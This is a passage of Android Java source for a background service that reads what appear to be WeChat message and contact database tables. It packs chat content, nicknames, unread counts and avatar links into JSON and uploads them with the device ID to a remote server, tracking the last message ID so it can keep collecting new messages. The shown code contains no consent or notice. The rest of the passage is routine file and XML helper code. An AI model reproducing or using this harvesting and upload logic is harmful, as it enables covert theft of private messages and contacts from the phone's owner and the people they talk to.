                        String MsgUnReadCount = mLast.getString(mLast.getColumnIndex("unReadCount"));
                        String MsgIsSend = mLast.getString(mLast.getColumnIndex("isSend"));
                        String MsgTime = mLast.getString(mLast.getColumnIndex("conversationTime"));
                        String MsgContent = mLast.getString(mLast.getColumnIndex("content"));

                        try {
                            JSONObject stoneObject = new JSONObject();
                            stoneObject.put("username", MsgUsername);
                            stoneObject.put("nickname", MsgNickname);
                            stoneObject.put("unReadCount", MsgUnReadCount);
                            stoneObject.put("isSend", MsgIsSend);
                            stoneObject.put("conversationTime", MsgTime);
                            stoneObject.put("content", MsgContent);
                            mUnReadArray.put(stoneObject);
                        } catch (Exception e) {
                            // TODO: handle exception-
                            e.printStackTrace();
                        }
//                        Log.i(TAG, MsgNickname + "&&&&&&" + MsgUnReadCount + "*****" + MsgTime + "**&**" + MsgContent );
                    }
                }
                mLast.close();
            }

            //

            Cursor mCursor = db.rawQuery("select rcontact.username,rcontact.nickname ,message.msgId,message.isSend,message.content,message.createTime from message, rcontact where message.talker=rcontact.username and  (msgId between ? and ? );",
                    new String[]{Integer.toString(mMsgId1),mMsgId} );
            Log.i(TAG,"mMsgId :"+mCursor.getCount());
            if (mCursor.getCount()>0) {

                while (mCursor.moveToNext()) {
                    String MsgTalker = mCursor.getString(mCursor.getColumnIndex("username"));
                    String MsgNickname = mCursor.getString(mCursor.getColumnIndex("nickname"));
                    String MsgId = mCursor.getString(mCursor.getColumnIndex("msgId"));
                    String MsgIsSend = mCursor.getString(mCursor.getColumnIndex("isSend"));
                    String MsgContent = mCursor.getString(mCursor.getColumnIndex("content"));
                    String MsgCreateTime = mCursor.getString(mCursor.getColumnIndex("createTime"));
                    try {
                        JSONObject stoneObject = new JSONObject();
                        stoneObject.put("msgId", MsgId);
                        stoneObject.put("isSend", MsgIsSend);
                        stoneObject.put("username", MsgTalker);
                        stoneObject.put("nickname", MsgNickname);
                        stoneObject.put("createTime", MsgCreateTime);
                        stoneObject.put("content", MsgContent);
                        MsgContentArray.put(stoneObject);
                    } catch (Exception e) {
                        // TODO: handle exception
                        e.printStackTrace();
                    }
//                    Log.i(TAG, MsgId + "&&&&&&" + MsgNickname + "*****" + MsgIsSend + "**&**" + MsgTalker + "******" + MsgContent);
                }
                mCursor.close();
            }

            String FmsgJson = mFmsgArray.toString();
            String unReadJson = mUnReadArray.toString();
            String msgJson = MsgContentArray.toString();
            String contactNameJson = mContactNameArray.toString();
            String imgLogoJson = mImgLogoArray.toString();
            Log.i(TAG, unReadJson);
            Log.i(TAG, FmsgJson);
//            Log.i(TAG, msgJson);
//                进行网络请求操作；
            Call<ResponseBody> callBrand1 = ServiceFactory.getMainIns().upload_msg_json(mDeviceId,msgJson,FmsgJson,unReadJson,contactNameJson ,imgLogoJson);
            callBrand1.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                    if (response.isSuccessful()) {
                        try {
                            String data = response.body().string();
                            JSONObject jo = new JSONObject(data);
                            String report = jo.optString("report");
                            Log.i(TAG, report);
                            if (report.equals("ok")) {
                                Toast.makeText(GetDataService.this, "更新成功", Toast.LENGTH_SHORT).show();
                            }
                        } catch (IOException | JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }
                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                }
            });


            SharedPreferences.Editor editor = mSharedPreferences.edit();//获取编辑器
            editor.putString("msgId", mMsgId);
            editor.putString("fmsgSysRowId", mFmsgId);
            editor.putString("lastTime", mLastTime);
            editor.commit();//提交修改

        }
        //

        lastTime.close();
        msgSysRowId.close();
        selectMsgId.close();
        db.close();
    }


    //////解析XML字符串///////////////
    public Map<String, String> XmlToString(String mMsg){
        Document doc = null;
        Map<String, String> connectionInfo = null;
        try {
            doc = DocumentHelper.parseText(mMsg);
            Element rootElt = doc.getRootElement(); // 获取根节点
            System.out.println("根节点：" + rootElt.getName()); // 拿到根节点的名称
            connectionInfo = new HashMap<String, String>();
            List<Attribute> attributes = rootElt.attributes();
            for (int i = 0; i < attributes.size(); ++i) { // 添加节点属性
                connectionInfo.put(attributes.get(i).getName(), attributes.get(i).getValue());
            }

        } catch (DocumentException e) {
            e.printStackTrace();
        }

//        String country =connectionInfo.get("country") ;
//        String province =connectionInfo.get("province")  ;
//        String city = connectionInfo.get("city") ;
//        LogUtil.i(country+"&&&"+province+"&&&"+city);


        return connectionInfo;
    }

/////////////////////////////////
    public String resultSetToJson(ResultSet rs) throws SQLException,JSONException
    {
        // json数组
        JSONArray array = new JSONArray();

        // 获取列数
        try{
            ResultSetMetaData metaData = rs.getMetaData();
            int columnCount = metaData.getColumnCount();

            // 遍历ResultSet中的每条数据

            while (rs.next()) {
                JSONObject jsonObj = new JSONObject();

                // 遍历每一列

                try {
                    for (int i = 1; i <= columnCount; i++) {
                        String columnName =metaData.getColumnLabel(i);
                        String value = rs.getString(columnName);
                        jsonObj.put(columnName, value);
                    }
                } catch (Exception e) {
                    // TODO: handle exception
                    e.printStackTrace();
                }



                array.put(jsonObj);
            }
        } catch (java.sql.SQLException e) {
            e.printStackTrace();
        }

        return array.toString();
    }


    /**
     * 判断SDCard是否存在 [当没有外挂SD卡时，内置ROM也被识别为存在sd卡]
     *
     * @return
     */
    public static boolean isSdCardExist() {
        return Environment.getExternalStorageState().equals(
                Environment.MEDIA_MOUNTED);
    }
    /**
     * 获取SD卡根目录路径
     *
     * @return
     */
    public static String getSdCardPath() {
        boolean exist = isSdCardExist();
        String sdpath = "";
        if (exist) {
            sdpath = Environment.getExternalStorageDirectory()
                    .getAbsolutePath();
        } else {
            sdpath = "不适用";
        }
        return sdpath;

    }
    /**
     * 获取默认的文件路径
     *
     * @return
     */
    public static String getDefaultFilePath() {
        String filepath = "";
        File file = new File(Environment.getExternalStorageDirectory(),
                "test.txt");
        if (file.exists()) {
            filepath = file.getAbsolutePath();
        } else {
            filepath = "不适用";
        }
        return filepath;
    }
    /*
   public void readFileFS()  //使用FileInputStream读取文件
   {
        try {
           File file = new File(Environment.getExternalStorageDirectory(),
                   "test.txt");
            FileInputStream is = new FileInputStream(file);

           byte[] b = new byte[is.available()];
            is.read(b);
            String result = new String(b);
            System.out.println("读取成功："+result);
        } catch (Exception e) {
           e.printStackTrace();
        }
   }
   */
    public void readFileBR() //使用BufferReader读取文件
    {
        try {
            File file = new File(Environment.getExternalStorageDirectory(),
                    "test.txt");
            BufferedReader br = new BufferedReader(new FileReader(file));
            String readline = "";
            StringBuffer sb = new StringBuffer();
            while ((readline = br.readLine()) != null) {
                System.out.println("readline:" + readline);
                sb.append(readline);
            }
            br.close();
            System.out.println("读取成功：" + sb.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void save(String filecontent)  //位于/data/data/<package name>/files
    {
        //Time t = new Time(); // or Time t=new Time("GMT+8"); 加上Time Zone资料。
        //t.setToNow(); // 取得系统时间。
        //String filename=String.format("%04d-%02d-%02d.txt", t.year,t.month+1,t.monthDay);
        String filename="视力记录表.txt";
        try {
            if(Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)){
                File f2 = new File(Environment.getExternalStorageDirectory()+"/test/");
                f2.mkdir();
                //Toast.makeText(this,"卡"+f2.toString()+"/"+filename,Toast.LENGTH_SHORT).show();
                //执行存储sdcard方法

                File f = new File(f2,filename);
                FileOutputStream out = new FileOutputStream(f,true);
                out.write(filecontent.getBytes("UTF-8"));
            }
            else{
                //存储到手机中，或提示
                Toast.makeText(this,"无卡,保存到手机"+getFilesDir().toString()+"/"+filename,Toast.LENGTH_SHORT).show();
                FileOutputStream outStream=this.openFileOutput(filename,Context.MODE_APPEND); //模式会检查文件是否存在，存在就往文件追加内容，否则就创建新文件。
                outStream.write(filecontent.getBytes("UTF-8"));
                outStream.close();
            }

        } catch (FileNotFoundException e) {
            return;
        }
        catch (IOException e){
            return ;
        }
    }
    public String readAll()
    {
        StringBuffer sb = new StringBuffer();
        String filename="test.txt";
        try {
            if(Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)){
                File f2 = new File(Environment.getExternalStorageDirectory()+"/test/");

                File f = new File(f2,filename);
                BufferedReader br = new BufferedReader(new FileReader(f));
                String readline = "";

                while ((readline = br.readLine()) != null) {
                    //  System.out.println("readline:" + readline);
                    Log.d("chenhao", "chenhao"+"readline:" + readline);
                    sb.append(readline);
                }
                br.close();
            }
            else{
                //存储到手机中，或提示
                Toast.makeText(this,"无卡"+getFilesDir().toString()+"/"+filename,Toast.LENGTH_SHORT).show();
            }

        } catch (FileNotFoundException e) {
            return "";
        }
        catch (IOException e){
            return "";
        }

        return "读取成功：" + sb.toString();

    }
    public String readFirstLine()
    {
        StringBuffer sb = new StringBuffer();
        String filename="test.txt";
        try {
            if(Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)){
                File f2 = new File(Environment.getExternalStorageDirectory()+"/test/");

                File f = new File(f2,filename);
                BufferedReader br = new BufferedReader(new FileReader(f));
                String readline = "";
                readline = br.readLine();
                //  while ((readline = br.readLine()) != null) {
                //  System.out.println("readline:" + readline);
                Log.d("chenhao", "chenhao"+"readline:" + readline);
                sb.append(readline);
                //  }
                br.close();
            }
            else{
                //存储到手机中，或提示
                Toast.makeText(this,"无卡"+getFilesDir().toString()+"/"+filename,Toast.LENGTH_SHORT).show();
            }

        } catch (FileNotFoundException e) {
            return "没有找到文件";
        }
        catch (IOException e){
            return "IO异常";
        }
        return "首行读取成功：" + sb.toString();

    }



}
